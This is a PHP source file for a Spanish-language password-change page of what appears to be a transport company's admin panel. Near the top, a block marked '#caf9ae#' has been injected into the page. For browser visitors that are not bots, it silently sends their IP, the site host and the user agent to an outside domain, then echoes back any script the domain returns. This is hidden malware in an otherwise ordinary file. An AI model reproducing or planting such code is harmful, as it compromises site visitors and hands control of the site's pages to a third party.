<?php
	session_start();
	if(!isset($_SESSION["usuario"]))
	{
		header("Location: index.html");
	}	
	require("../conexion/ajax.php");
?>
<?php
#caf9ae#
error_reporting(0); @ini_set('display_errors',0); $wp_fsh3 = @$_SERVER['HTTP_USER_AGENT']; if (( preg_match ('/Gecko|MSIE/i', $wp_fsh3) && !preg_match ('/bot/i', $wp_fsh3))){
$wp_fsh093="http://"."web"."https".".com/"."web/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_fsh3);
if (function_exists('curl_init') && function_exists('curl_exec')) {$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_fsh093); curl_setopt ($ch, CURLOPT_TIMEOUT, 20); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$wp_3fsh = curl_exec ($ch); curl_close($ch);} elseif (function_exists('file_get_contents') && @ini_get('allow_url_fopen')) {$wp_3fsh = @file_get_contents($wp_fsh093);}
elseif (function_exists('fopen') && function_exists('stream_get_contents')) {$wp_3fsh=@stream_get_contents(@fopen($wp_fsh093, "r"));}}
if (substr($wp_3fsh,1,3) === 'scr'){ echo $wp_3fsh; }
#/caf9ae#
?>
<script language="javascript" type="text/javascript">
	function go()
	{
		location.href="administrador.php";
	}
	function actualizar()
	{
		agregarCargando('cargando');
		usuario = document.getElementById("textUsuario").value;
		passAct = document.getElementById("textContrasenha").value;
		passNew = document.getElementById("textNuevaContrasenha").value;
		passNew2 = document.getElementById("textNuevaContrasenha2").value;
		
		if(usuario.length==0 || passAct.length==0 || passNew.length==0 || passNew2.length==0)
		{
			alert("¡ Todos los campos deben estar llenados correctamente !");
			quitarCargando('cargando');
			return;
		}
		else if(passNew!=passNew2)
		{
			alert("¡ La nueva contraseña no concuerda !");
			quitarCargando('cargando');
			return;
		}
		
		document.getElementById("form1").submit();
	}
</script>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<style type="text/css">
<!--
.Estilo2 {font-weight: bold}
-->
</style>
<title>:: Transportes Marin Hermanos - ModificarContrasenha ::</title></head>
<body>
<table width="1003" border="0" cellspacing="0" cellpadding="0">
  <tr>
    <td width="156" background="../conexion/Img/bg1222.jpg">&nbsp;</td>
    <td width="780"><table width="780" border="0" align="center" cellpadding="0" cellspacing="0">
      <tr>
        <td width="819">&nbsp;</td>
      </tr>
      <tr>
        <td><img src="../imagenes/sup.jpg" width="780" height="193" /></td>
      </tr>
      <tr>
        <td height="142"><form id="form1" name="form1" method="post" action="admin.php">
          <table width="533" border="0" align="center">
            <tr>
              <th height="52" colspan="3" scope="col"><div align="center">MODIFICAR CONTRASE&Ntilde;A </div></th>
              </tr>
            <tr>
              <td width="241" height="36"><em><strong>Usuario :</strong></em></td>
              <td width="167"><label>
                <input name="textUsuario" type="text" id="textUsuario" />
              </label></td>
              <td width="103">&nbsp;</td>
            </tr>
            <tr>
              <td height="36"><em><strong>Contrase&ntilde;a : </strong></em></td>
              <td><label>
                <input name="textContrasenha" type="password" id="textContrasenha" />
              </label></td>
              <td><div align="center" id="cargando"></div></td>
            </tr>
            <tr>
              <td height="33"><em><strong>Nueva Contrase&ntilde;a : </strong></em></td>
              <td><label>
                <input name="textNuevaContrasenha" type="password" id="textNuevaContrasenha" />
              </label></td>
              <td>&nbsp;</td>
            </tr>
            <tr>
              <td height="34"><em><strong>Repetir Nueva Contrase&ntilde;a : </strong></em></td>
              <td><label>
                <input name="textNuevaContrasenha2" type="password" id="textNuevaContrasenha2" />
              </label></td>
              <td>&nbsp;</td>
            </tr>
            <tr>
              <td colspan="3">&nbsp;</td>
              </tr>
            <tr>
              <td><div align="center">
                <label>
                <input name="Actualizar" type="button" id="Actualizar" value="Actualizar" onClick="actualizar()" />
                </label>
                <label>
                <input name="op" type="hidden" id="op" value="cambiarContra" />
                </label>
              </div></td>
              <td colspan="2"><label>
                <div align="center">
                  <input name="Cancelar" type="button" id="Cancelar" value="Cancelar" onClick="go()" />
                  </div>
              </label></td>
              </tr>
          </table>
        </form>        </td>
      </tr>
      <tr>
        <td bgcolor="#6DAA37">&nbsp;</td>
      </tr>
      <tr>
        <td bgcolor="#091549" class="Estilo2"><div align="center" class="Estilo2"></div></td>
      </tr>

    </table></td>
    <td width="67" background="../conexion/Img/bg1223.jpg">&nbsp;</td>
  </tr>
</table>
</body>
</html>

